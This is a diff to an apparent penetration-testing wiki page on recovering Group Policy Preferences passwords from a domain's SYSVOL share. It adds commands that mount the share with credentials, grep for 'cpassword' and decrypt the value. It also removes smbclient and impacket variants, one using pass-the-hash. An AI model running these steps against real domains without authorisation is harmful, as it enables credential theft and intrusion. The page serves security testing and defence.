@@ -12,6 +12,8 @@ GPP \(Group Policy Preferences\)
 
 {% tabs %}
 {% tab title="UNIX-like" %}
+Tip : since the following operations require mounting of the SYSVOL share, it can't be done through a docker environment
+
 msfconsole or manually finding them by mounting and grep, or accessing and manually open everything
 
 ```bash
@@ -26,35 +28,25 @@ msf auxiliary(smb_enum_gpp) > run
 or manually mount and grep
 
 ```bash
-# anon
-mount -t cifs //$DOMAIN_CONTROLLER/SYSVOL $Mount_target
+# create the target directory for the mount
+sudo mkdir /tmp/sysvol
 
-# auth
-mount -t cifs -o username=$DOMAIN_USER,password=$DOMAIN_PASSWORD,domain=$DOMAIN //$DOMAIN_CONTROLLER/SYSVOL/ $Mount_target
+# mount the SYSVOL share
+sudo mount\
+    -o domain='domain.local'\
+    -o username='someuser'\
+    -o password='password'\
+    -t cifs\
+    '//domain_controller/SYSVOL'\
+    /tmp/sysvol
+
+# recursively look for "cpassword" in Group Policies
+sudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null
+
+# decrypt the string and recover the password
+pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
+gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
-
-or manually smbclient from samba suite 
-
-```bash
-smbclient //$DOMAIN_CONTROLLER/SYSVOL -U $DOMAIN_USER
-```
-
-or smbclient.py from impacket
-
-```bash
-# Plaintext password
-smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
-
-# Pass-the-hash
-smbclient.py -hashes $LMhash:$NThash 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
-
-# Use the SYSVOL share
-> use SYSVOL
-```
-
-then decrypt
-
-gpp decrypt
 {% endtab %}
 
 {% tab title="Windows" %}
